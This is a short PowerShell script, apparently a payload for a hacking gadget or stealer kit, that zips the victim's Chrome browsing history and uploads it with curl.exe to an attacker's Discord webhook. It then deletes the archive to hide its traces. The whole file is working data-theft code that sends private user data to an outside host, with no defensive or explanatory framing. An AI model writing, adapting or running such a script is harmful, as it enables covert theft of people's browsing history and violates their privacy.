# Your Discord webhook URL
$discordWebhookUrl = "$dc"

$chromeHistoryPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"

$destinationFolder = "C:\Temp"

$archiveFileName = "ChromeHistoryArchive.zip"

$archiveFilePath = Join-Path $destinationFolder $archiveFileName

Compress-Archive -Path $chromeHistoryPath -DestinationPath $archiveFilePath -Force

& curl.exe -F "file1=@$archiveFilePath" $discordWebhookUrl

Remove-Item -Path $archiveFilePath -Force
